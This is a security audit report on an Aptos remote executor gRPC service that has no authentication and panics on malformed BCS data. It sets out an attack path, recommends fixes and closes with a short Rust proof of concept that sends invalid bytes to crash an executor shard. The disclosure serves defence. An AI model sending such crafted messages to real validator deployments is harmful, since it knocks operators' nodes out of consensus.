# Audit Report

## Title
Unauthenticated Denial of Service via Type Confusion in Remote Executor gRPC Service

## Summary
The gRPC network service used for remote sharded execution accepts unauthenticated messages and performs unsafe deserialization with `.unwrap()`, allowing any network attacker to crash executor shards by sending malformed data, causing consensus liveness failures when remote execution is enabled.

## Finding Description

The remote executor service implements a gRPC-based message routing system for distributed transaction execution across shards. This system has three critical security flaws that combine to create a severe denial-of-service vulnerability:

**1. No Authentication on gRPC Endpoint**

The gRPC server starts without any authentication mechanism. [1](#0-0) 

Any network peer that can reach the server's `SocketAddr` can send arbitrary messages.

**2. Unvalidated Message Type Routing**

The `simple_msg_exchange()` function directly uses the incoming `message_type` string to look up handlers without validation. [2](#0-1) 

The message type is extracted from the protobuf and used directly as a HashMap key with no verification that the sender is authorized or that the message content is valid.

**3. Unsafe Deserialization with Panic on Failure**

When handlers receive messages, they deserialize using BCS with `.unwrap()`, causing panics on invalid data:

- In the coordinator client (shard receiving execution commands): [3](#0-2) 

- In the executor client (coordinator receiving results): [4](#0-3) 

**4. Integration with Critical Execution Path**

The remote executor is used in the actual block execution path when configured: [5](#0-4) 

**Attack Propagation Path:**

1. Attacker identifies a remote executor shard's gRPC endpoint (e.g., discovering via network scanning or configuration files)
2. Attacker determines the predictable message type format: [6](#0-5) 
3. Attacker sends a gRPC request with:
   - `message_type`: `"execute_command_0"` (valid registered type)
   - `message`: Random or malformed bytes that won't deserialize to `RemoteExecutionRequest`
4. The gRPC service routes the message to the handler without validation
5. The handler attempts BCS deserialization with `.unwrap()`
6. Deserialization fails, causing a panic and crashing the executor shard thread
7. When the coordinator attempts block execution, it tries to communicate with the crashed shard
8. Block execution fails, preventing the validator from participating in consensus

This breaks the **consensus liveness invariant**: validators must be able to execute blocks to participate in consensus.

## Impact Explanation

This vulnerability qualifies as **High Severity** under the Aptos bug bounty program:

- **"Validator node slowdowns"**: Crashing executor shards prevents validators from executing blocks efficiently
- **"Significant protocol violations"**: Preventing block execution violates the core requirement that validators must be able to process transactions

The impact is **not** classified as Critical because:
- It does not cause loss of funds or consensus safety violations
- It does not create a permanent network partition (restarting the service recovers)
- It requires remote executor shards to be deployed (not default configuration)

However, when remote execution **is** enabled, this becomes a critical availability issue as any network attacker can prevent validators from executing blocks, effectively removing them from consensus participation.

## Likelihood Explanation

**Likelihood: High** when remote executor shards are deployed.

**Attacker Requirements:**
- Network access to the gRPC endpoint (no authentication required)
- Knowledge of predictable message type format (trivial, follows `"execute_command_{shard_id}"` pattern)
- Ability to send gRPC requests (standard tools like `grpcurl` suffice)

**Complexity: Trivial**
- No special privileges needed
- No cryptographic operations required
- Attack can be scripted in minutes

The main limiting factor is that remote executor deployment appears to be an optional feature controlled by configuration: [7](#0-6) 

If validators do not set remote addresses, they use local sharded execution instead and are not vulnerable.

## Recommendation

Implement defense-in-depth measures:

**1. Add Authentication/Authorization**
Implement mutual TLS or authentication tokens on the gRPC service, similar to patterns used elsewhere in the codebase for secure services.

**2. Validate Message Types**
Add a whitelist of allowed message types per connection/peer and validate incoming message types against authorized operations.

**3. Use Safe Deserialization**
Replace `.unwrap()` calls with proper error handling:

```rust
// In remote_cordinator_client.rs, line 89
let request: RemoteExecutionRequest = match bcs::from_bytes(&message.data) {
    Ok(req) => req,
    Err(e) => {
        error!("Failed to deserialize execution request: {}", e);
        return ExecutorShardCommand::Stop;
    }
};
```

**4. Add Input Validation**
Verify message structure and size before deserialization to detect obviously malformed data.

**5. Network Isolation**
Document that remote executor shards should only be deployed in trusted network environments with firewall rules restricting access to authorized coordinators.

## Proof of Concept

```rust
// File: exploit_poc.rs
// Demonstrates denial of service against remote executor shard

use aptos_protos::remote_executor::v1::{
    network_message_service_client::NetworkMessageServiceClient,
    NetworkMessage,
};
use tonic::transport::Channel;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Target a remote executor shard (replace with actual address)
    let target_addr = "http://127.0.0.1:52201"; // Example shard address
    
    // Connect to the gRPC service
    let mut client = NetworkMessageServiceClient::connect(target_addr).await?;
    
    // Craft malicious message with valid message_type but invalid payload
    let malicious_message = NetworkMessage {
        message_type: "execute_command_0".to_string(), // Valid registered type
        message: vec![0xFF, 0xFF, 0xFF, 0xFF], // Invalid BCS data
    };
    
    // Send the malicious message
    // This will cause the handler to panic when it tries to deserialize
    match client.simple_msg_exchange(malicious_message).await {
        Ok(_) => println!("Message sent - executor shard should crash on deserialization"),
        Err(e) => println!("Error sending message: {}", e),
    }
    
    // The executor shard's handler thread will panic at:
    // remote_cordinator_client.rs:89
    // let request: RemoteExecutionRequest = bcs::from_bytes(&message.data).unwrap();
    //                                                                        ^^^^^^^
    // Thread will crash, making the shard unavailable for block execution
    
    Ok(())
}
```

**To verify the vulnerability:**
1. Start a remote executor shard with the network service enabled
2. Run the exploit code pointing to the shard's gRPC endpoint
3. Observe the shard crash with a panic from BCS deserialization
4. Attempt to execute a block - it will fail because the shard is unavailable

## Notes

This vulnerability only affects deployments using remote executor shards (distributed execution mode). The default local execution mode is not affected. However, for deployments that do use remote execution for performance optimization, this represents a critical denial-of-service vector that could be exploited to disrupt validator operations without any authentication or special privileges.

### Citations

**File:** secure/net/src/grpc_network_service/mod.rs (L75-88)
```rust
        Server::builder()
            .timeout(std::time::Duration::from_millis(rpc_timeout_ms))
            .add_service(
                NetworkMessageServiceServer::new(self).max_decoding_message_size(MAX_MESSAGE_SIZE),
            )
            .add_service(reflection_service)
            .serve_with_shutdown(server_addr, async {
                server_shutdown_rx.await.ok();
                info!("Received signal to shutdown server at {:?}", server_addr);
            })
            .await
            .unwrap();
        info!("Server shutdown at {:?}", server_addr);
    }
```

**File:** secure/net/src/grpc_network_service/mod.rs (L93-116)
```rust
    async fn simple_msg_exchange(
        &self,
        request: Request<NetworkMessage>,
    ) -> Result<Response<Empty>, Status> {
        let _timer = NETWORK_HANDLER_TIMER
            .with_label_values(&[&self.self_addr.to_string(), "inbound_msgs"])
            .start_timer();
        let remote_addr = request.remote_addr();
        let network_message = request.into_inner();
        let msg = Message::new(network_message.message);
        let message_type = MessageType::new(network_message.message_type);

        if let Some(handler) = self.inbound_handlers.lock().unwrap().get(&message_type) {
            // Send the message to the registered handler
            handler.send(msg).unwrap();
        } else {
            error!(
                "No handler registered for sender: {:?} and msg type {:?}",
                remote_addr, message_type
            );
        }
        Ok(Response::new(Empty {}))
    }
}
```

**File:** execution/executor-service/src/remote_cordinator_client.rs (L32-34)
```rust
        let execute_command_type = format!("execute_command_{}", shard_id);
        let execute_result_type = format!("execute_result_{}", shard_id);
        let command_rx = controller.create_inbound_channel(execute_command_type);
```

**File:** execution/executor-service/src/remote_cordinator_client.rs (L80-90)
```rust
    fn receive_execute_command(&self) -> ExecutorShardCommand<RemoteStateViewClient> {
        match self.command_rx.recv() {
            Ok(message) => {
                let _rx_timer = REMOTE_EXECUTOR_TIMER
                    .with_label_values(&[&self.shard_id.to_string(), "cmd_rx"])
                    .start_timer();
                let bcs_deser_timer = REMOTE_EXECUTOR_TIMER
                    .with_label_values(&[&self.shard_id.to_string(), "cmd_rx_bcs_deser"])
                    .start_timer();
                let request: RemoteExecutionRequest = bcs::from_bytes(&message.data).unwrap();
                drop(bcs_deser_timer);
```

**File:** execution/executor-service/src/remote_executor_client.rs (L166-169)
```rust
        for rx in self.result_rxs.iter() {
            let received_bytes = rx.recv().unwrap().to_bytes();
            let result: RemoteExecutionResult = bcs::from_bytes(&received_bytes).unwrap();
            results.push(result.inner?);
```

**File:** execution/executor/src/workflow/do_get_execution_output.rs (L261-267)
```rust
        if !get_remote_addresses().is_empty() {
            Ok(V::execute_block_sharded(
                &REMOTE_SHARDED_BLOCK_EXECUTOR.lock(),
                partitioned_txns,
                state_view,
                onchain_config,
            )?)
```
